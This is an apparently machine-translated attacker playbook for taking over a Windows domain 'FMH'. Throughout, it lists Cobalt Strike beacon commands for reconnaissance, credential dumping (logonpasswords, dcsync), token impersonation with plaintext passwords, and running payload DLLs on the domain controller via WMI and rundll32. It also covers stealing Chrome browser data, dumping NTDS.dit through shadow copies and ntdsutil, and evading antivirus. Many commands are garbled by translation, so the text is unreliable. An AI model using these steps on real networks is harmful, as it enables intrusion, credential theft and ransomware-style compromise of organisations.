@@ -1,0 +1,147 @@
+C:\Windows\System32\config\sam
+C:\Windows\System32\config\security
+C:\Windows\System32\config\system
+------------------> these files store information such as the hashed passwords of all Windows user accounts,
+security-related parameters, encryption key data, and other important information about the OS kernel configuration.
+
+sleeping disk 5
+ps
+cd C:\ProgramData
+AV_Query
+powershell-import /selection/PowerSploit-development/Intelligence/PowerView. ps1
+powershell Get -
+Domain controller powershell Get-Domain Computer-dnshostname properties
+powershell Get-domaincomputer-Operating system * server* - dnshostname properties
+network shell of the
+Domain Administrators group /network shell of the Enterprise Administrators group domain /domain
+logonpasswords shell
+nltest /DOMAIN_TRUSTS
+make_token FMH\maysys 34stb4y@345
+dcsync
+download FMH /home/tester/Desktop/payload/x64.dll (\\FMH-DC01.FMH.local\C$\ProgramData\x64.dll)
+remote wmi by FMH-DC01 rundll32.exe C:\ProgramData\x64.dll StartW
+rm \\FMH-DC01.FMH.local\C$\ProgramData\x64.dll
+download /home/tester/Desktop/FMH/x64.dll (\\FMH-DC01.FMH.local\C$\ProgramData\x64.dll)
+download /home/tester/Desktop/FMH/tlt.dll (\\FMH-DC01.FMH. local\C$\ProgramData\tlt.dll)
+remote performer wmi FMH-DC01 rundll32.exe C:\ProgramData\tlt.dll StartW
+rm \ \ FMH-DC01.FMH. local\C$\ProgramData\tlt.dll
+rm \ \ FMH-DC01.FMH. local\C$\ProgramData\x64.dll
+rev2self
+make_token FMH.local\Administrator 34stb4y*. *
+powershell-import /select/Resource usage-development/Intelligence/ShareFinder. ps1
+Powerpick function call-ShareFinder-Ping-Access check-Detailed / Outgoing file-ascii encoding C:\ProgramData\share.txt
+download C:\ProgramData\share.txt
+rm C:\ProgramData\share.txt
+dcsync FMH.local
+download /home/tester/Desktop/FMH/tlt.dll (\\OPERA-APP. FMH. local\C$\ProgramData\tlt.dll)
+the remote remains in the WMI opera-app. fmx. local rundll32.exe C:\ProgramData\tlt.dll StartW
+RM \ \ Opera-app. FMX. local With\C$\ProgramData\tlt.dll
+sleep 0
+net domain_controllers
+net domain_trusts
+sink whoami /all
+shell hostname
+in PowerShell do-adcomputer-filter * / select-expand
+boot name /home/host/desktop/1. the bat (C:\ProgramData\1.bat)
+CD-ROM with a shell
+c:\programata ls
+powershell get-adcomputer-filter * - properties password set | select name, ipv4 address, password set | sort password set
+
+
+shell 1.
+echo bat FMH-DC01 1>>c:\programdata\qu.txt
+user / server:FMH-DC01 1>>c:\programdata\qu.txt
+
+powershell Gets-ADComputer-Filter 'operating system - don't like" * server* "- and enabled-equalizer "true"' ` - Property name, Operating system, IPv4 address, Date of last entry | Sorting-Object-Property Operating System | Select-Object name-Properties, Operating System, IPv4 address, Date of last entry | Format-Table-Auto-Size | Output-c file:\programdata\workstations.txt
+in PowerShell to make-ADComputer -filter, the operating system is not only "*server*" - and enabled-EQ "true" ` - property name,operating system,IPv4 address,LastLogonDate | sort-object-property of OS | select-object -property name,operating system,IPv4 address,LastLogonDate | format-table-AutoSize property
+LS
+loading /home/node/desktop/2. the bat (C:\ProgramData\2.bat)
+echo OPERA-APP 1>>c:\programdata\qu.txt
+user /server:OPERA-APP 1>>c:\programdata\qu.txt
+in PowerShell to make-ADComputer -filter 'operating system like "*server*" - and enabled-EQ "true" ` - property name,operating system,IPv4 address,LastLogonDate | sort-object-property of OS | select-object -property name,operating system,IPv4 address,LastLogonDate | format-table-AutoSize property
+LS
+
+
+beacon> download /home/host/Desktop/3. bat (C:\ProgramData\3.bat)
+shell 3. bat
+echo FMH-DC01 1>>c:\programdata\sh.txt
+network view \ \ FMH-DC01 /all 1>>c:\programdata\sh.txt
+powershell get-adcomputer-filter * - password set properties | select a name, ipv4 address, password set | sort password set
+download C:\ProgramData\ts.txt
+download
+c:\programdata\sh.txt dir. shells \\192.168.1.82\c$
+a shell that updates itself does
+
+_token MH. local\backups of
+Riverd0gs1 dir. shell \\192.168.1.82\c$
+********************************************ANOTHER CAR******************
+sleep mode 5
+ps
+logonpasswords
+shell systeminfo /s FMH-EXCHANG01
+update
+yourself by making the FMH token.local \ Administrator 34stb4y*.*
+sleep 0
+dir. shell \\192.168.1.82\c$
+quser / shell server:192.168.1.89
+shell net user scott. gir /home
+shell task list / s 192.168.1.89
+download \\192.168.1.89\From$\\Scott users.Geer\AppData folder\Local\Google\Chrome\user data\default history\
+download \ \ 192.168.1.89\With$\\Scott users.Geer\AppData folder\Local\Google\Chrome\User data\default\registration data
+sink ping FMX-BACKUPS02
+quser / shell server:FMH-BACKUP 02
+quser / shell server:192.168.1.132
+shell ping 192.168.1.132
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+get-adcomputer-filter * / select-expand name | output-c file:\programdata\hosts.txt
+
+
+
+Get-ADComputer-Filter 'operating system-not like "windows" -and enabled-equalizer "true"' ` - Property name, Operating system, IPv4 address, LastLogonDate | Sorting-Object-Property Operating System | Select-Object Name-Properties, Operating System, IPv4 address, LastLogonDate | Format-Table-Automatic resizing | output-c file:\programdata\other.txt
+
+
+Get-ADComputer-Filter 'operating system-as "server" - and enabled -equalizer "true"' ` - Property name, Operating System, IPv4 address, LastLogonDate | Sort-Object - Property of the Operating System | Select-Object name-Properties, Operating System, IPv4 address, LastLogonDate | Format-Table-Automatic resizing | output-c file:\programdata\servers.txt
+
+
+Get-ADComputer-Filter 'operating system-not like "server" -and enabled-equalizer "true"' ` - Property name, Operating system, IPv4 address, LastLogonDate | Sorting-Object - Property of the Operating System | Selection-Object name-Properties, Operating System, IPv4 address, LastLogonDate | Format-Table-Automatic resizing | output-c file:\programdata\workstations.txt
+
+with these scripts, we remove and parse the hosts that are in the grid
+right now I'll run a couple of bat files to see what processes are spinning, where what uses are sitting, all the available balls on the hosts
+
+*****************************************************************************************************************************************************************
+we take data from host.txt
+to make a bat file
+is done like
+this echo FMH-DC01 >> c:\programdata\qu.txt
+user / server:FMH-DC01 >> c:\programdata\qu.txt
+and so with each host that is from the output
+of the sun, we pack it into a file with the extension .the bat and run on the host via cmd, or shell in the CS shell 1. the bat
+is best run from the YES - domain admin, so that there is access via the RPC protocol to each available host in the ad
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+This tool can create a shadow copy of ntds. dit and system files
+1)vssadmin creates a shadow /for=C:
+
+copy \\?\GLOBAL Root Directory\Device\harddiskvolumesadocopi1\Windows\NTDS\NTDS. dit C:\programdata
+copy \\?\GLOBAL Root Directory\Device\Hard Disk \ Address1 \ Windows\System32\configuration\SYSTEM C:\programdata
+for the nts file dump
+Sven did you ask how to shoot quietly
+but still some strong avers can detect it, like sophos, sentinel or from palo alto
+or this method
+PS C: \ > ntdsutil
+C:\Windows\system32\ntdsutil.exe: activate the instance's ntds
+The active instance is assigned the value "ntds".
+C:\Windows\system32\ntdsutil.exe: ifm
+ifm: help
+
+? - Show this reference information
+Create Full %s - Create an IFM media for the full AD domain or an AD/LDS instance in the %s folder
+Create a full NoDefrag %s-Create an IFM media without defragmentation for a full AD DC or an AD/LDS instance in the %s folder
+Create RODC %s-Create a read-only DC IFM media in the %s folder
+Create Sysvol Full %s - Create an IFM media using SYSVOL for the full advertising controller in the %s folder
+Create Sysvol Full Node fragment %s-Create IFM media using SYSVOL and without defragmentation for full DC AD to folder %s Create Sysvol RODC %s - Create IFM media using SYSVOL for read-only DC to folder %s
+Help - Show this help information
+Exit - Return to the previous menu
+
+ifm: create a complete C:\pwdadmin
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
